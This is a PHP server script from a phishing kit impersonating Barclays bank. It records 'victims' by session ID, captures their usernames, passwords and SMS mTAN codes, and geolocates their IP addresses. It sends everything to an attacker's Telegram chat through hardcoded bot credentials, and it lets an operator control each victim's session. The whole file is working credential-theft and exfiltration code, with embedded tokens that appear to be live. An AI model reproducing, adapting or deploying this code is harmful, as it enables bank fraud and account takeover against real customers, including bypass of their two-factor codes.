<?php
// =======================================================
// ==         PUT YOUR TELEGRAM BOT CONFIG HERE        ==
// =======================================================
$TELEGRAM_BOT_TOKEN = "7814747483:AAHuEQmokhkbQMi0RWHWVmQzK-2Q-e6Luo8";
$TELEGRAM_CHAT_ID = "-5059059615";

// =======================================================
// ==              IP-API CONFIGURATION                ==
// =======================================================
$IP_API_TOKEN = "6Dc0S679WvFlAyA"; // Your IP-API token
// =======================================================

error_reporting(0);
header('Content-Type: application/json');
header('Cache-Control: no-cache, no-store, must-revalidate');

$VICTIMS_DIR = 'victims_data/';
$action = $_GET['action'] ?? null;
$input = json_decode(file_get_contents('php://input'), true);

if (!is_dir($VICTIMS_DIR)) {
    mkdir($VICTIMS_DIR, 0755, true);
}

switch ($action) {
    case 'init_session':
        json_response(['id' => uniqid('vic-', true)]);
        break;
    case 'submit_data':
        submit_data($VICTIMS_DIR, $input, $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID);
        break;
    case 'check_status':
        check_status($VICTIMS_DIR, $input);
        break;
    default:
        json_response(['error' => 'Invalid action'], 400);
}

function json_response($data, $code = 200) {
    http_response_code($code);
    echo json_encode($data);
    exit;
}

function get_victim_filepath($victimId) {
    if (!$victimId || strpos($victimId, 'vic-') !== 0) return null;
    return $GLOBALS['VICTIMS_DIR'] . basename($victimId) . '.json';
}

function get_geolocation_data($ip) {
    $geo_data = [
        'country' => 'Unknown',
        'countryCode' => 'N/A',
        'regionName' => 'N/A',
        'city' => 'N/A',
        'zip' => 'N/A',
        'isp' => 'N/A',
        'org' => 'N/A',
        'as' => 'N/A'
    ];
    
    // Use IP-API with your token for better geolocation
    $geo = @json_decode(file_get_contents("http://pro.ip-api.com/json/{$ip}?key=6Dc0S679WvFlAyA&fields=status,country,countryCode,regionName,city,zip,isp,org,as,query"), true);
    if ($geo && $geo['status'] === 'success') {
        $geo_data['country'] = $geo['country'] ?? 'Unknown';
        $geo_data['countryCode'] = $geo['countryCode'] ?? 'N/A';
        $geo_data['regionName'] = $geo['regionName'] ?? 'N/A';
        $geo_data['city'] = $geo['city'] ?? 'N/A';
        $geo_data['zip'] = $geo['zip'] ?? 'N/A';
        $geo_data['isp'] = $geo['isp'] ?? 'N/A';
        $geo_data['org'] = $geo['org'] ?? 'N/A';
        $geo_data['as'] = $geo['as'] ?? 'N/A';
    } else {
        // Fallback to free API if premium fails
        $geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,countryCode,regionName,city,zip,isp,org,as,query"), true);
        if ($geo && $geo['status'] === 'success') {
            $geo_data['country'] = $geo['country'] ?? 'Unknown';
            $geo_data['countryCode'] = $geo['countryCode'] ?? 'N/A';
            $geo_data['regionName'] = $geo['regionName'] ?? 'N/A';
            $geo_data['city'] = $geo['city'] ?? 'N/A';
            $geo_data['zip'] = $geo['zip'] ?? 'N/A';
            $geo_data['isp'] = $geo['isp'] ?? 'N/A';
            $geo_data['org'] = $geo['org'] ?? 'N/A';
            $geo_data['as'] = $geo['as'] ?? 'N/A';
        }
    }
    
    return $geo_data;
}

function submit_data($dir, $input, $telegramToken, $telegramChatId) {
    if (!isset($input['id'], $input['step'], $input['value'])) {
        json_response(['error' => 'Missing data.'], 400);
    }
    $filePath = get_victim_filepath($input['id']);
    if (!$filePath) {
        json_response(['error' => 'Invalid ID'], 400);
    }

    $data = file_exists($filePath) ? json_decode(file_get_contents($filePath), true) : [];
    $ip = $_SERVER['REMOTE_ADDR'];

    // Initialize on first contact or if geo data is missing
    if (empty($data) || !isset($data['country'])) {
        $data = [
            'id' => $input['id'],
            'timestamp' => date('Y-m-d H:i:s'),
            'ip_address' => $ip,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'N/A',
            'decision' => 'wait'
        ];
        
        // Get geolocation data
        $geo_data = get_geolocation_data($ip);
        $data = array_merge($data, $geo_data);
    }

    // Store the submitted data
    $data[$input['step']] = $input['value'];
    $data['last_seen'] = time();

    // Only update status automatically if no admin decision is pending
    if (($data['decision'] ?? 'wait') === 'wait') {
        switch ($input['step']) {
            case 'login': 
                $data['status'] = 'Waiting for mTAN'; 
                break;
            case 'mtan': 
                $data['status'] = 'Completed'; 
                break;
        }
    }
    
    file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
    
    // Send to Telegram for both login and mtan steps
    send_professional_telegram_notification($telegramToken, $telegramChatId, $data, $input['step']);

    json_response(['status' => 'success']);
}

function check_status($dir, $input) {
    if (!isset($input['id'])) {
        json_response(['decision' => 'wait']);
    }
    $filePath = get_victim_filepath($input['id']);
    if (!$filePath || !file_exists($filePath)) {
        json_response(['decision' => 'wait']);
    }

    $data = json_decode(file_get_contents($filePath), true);
    $data['last_seen'] = time();
    
    $decision = $data['decision'] ?? 'wait';
    
    // Only reset decision if it's not a final decision
    if (!in_array($decision, ['finish', 'block'])) {
        $data['decision'] = 'wait'; 
    }
    
    file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
    
    json_response(['decision' => $decision]);
}

// PROFESSIONAL TELEGRAM NOTIFICATION FOR BOTH LOGIN AND SMS
function send_professional_telegram_notification($botToken, $chatId, $data, $step) {
    if (empty($botToken) || empty($chatId)) {
        error_log("Telegram configuration missing");
        return;
    }

    $message = "🦅 <b>BARCLAYS SECURITY ALERT</b> 🦅\n\n";
    
    if ($step === 'login') {
        $message .= "🔐 <b>NEW LOGIN DETECTED</b>\n\n";
    } else if ($step === 'mtan') {
        $message .= "📱 <b>SMS CODE RECEIVED - FULL DATA</b>\n\n";
    }
    
    $message .= "🌍 <b>GEOLOCATION DATA:</b>\n";
    $message .= "┌──────────────────────────────\n";
    $message .= "│ 📡 <b>IP Address:</b> <code>{$data['ip_address']}</code>\n";
    
    if (isset($data['country']) && $data['country'] !== 'Unknown') {
        $message .= "│ 🏴 <b>Country:</b> {$data['country']} ({$data['countryCode']})\n";
    }
    if (isset($data['regionName']) && $data['regionName'] !== 'N/A') {
        $message .= "│ 🗺️ <b>Region:</b> {$data['regionName']}\n";
    }
    if (isset($data['city']) && $data['city'] !== 'N/A') {
        $message .= "│ 🏙️ <b>City:</b> {$data['city']}\n";
    }
    if (isset($data['zip']) && $data['zip'] !== 'N/A') {
        $message .= "│ 📮 <b>ZIP Code:</b> {$data['zip']}\n";
    }
    if (isset($data['isp']) && $data['isp'] !== 'N/A') {
        $message .= "│ 🌐 <b>ISP:</b> {$data['isp']}\n";
    }
    $message .= "└──────────────────────────────\n\n";
    
    $message .= "🔐 <b>CREDENTIALS:</b>\n";
    $message .= "┌──────────────────────────────\n";
    if (isset($data['login']['username'])) {
        $message .= "│ 👤 <b>Username:</b> <code>" . htmlspecialchars($data['login']['username']) . "</code>\n";
    }
    if (isset($data['login']['password'])) {
        $message .= "│ 🔑 <b>Password:</b> <code>" . htmlspecialchars($data['login']['password']) . "</code>\n";
    }
    
    // Add SMS code for mtan step
    if ($step === 'mtan' && isset($data['mtan']['mtan'])) {
        $message .= "│ 📱 <b>SMS Code:</b> <code>" . htmlspecialchars($data['mtan']['mtan']) . "</code>\n";
    }
    $message .= "└──────────────────────────────\n\n";
    
    $message .= "💻 <b>SYSTEM INFO:</b>\n";
    $message .= "┌──────────────────────────────\n";
    $message .= "│ ⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
    $message .= "│ 🔧 <b>User Agent:</b>\n";
    $message .= "│ <code>" . substr($data['user_agent'], 0, 50) . "...</code>\n";
    $message .= "└──────────────────────────────\n\n";
    
    if ($step === 'login') {
        $message .= "📈 <b>STATUS:</b> <code>Waiting for mTAN</code>\n";
    } else if ($step === 'mtan') {
        $message .= "📈 <b>STATUS:</b> <code>COMPLETED - FULL DATA CAPTURED</code>\n";
    }
    
    $message .= "──────────────────────────────\n";
    $message .= "<i>Barclays Security System • Automated Alert</i>";

    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];

    $ch = curl_init($telegramUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    curl_close($ch);
}

?>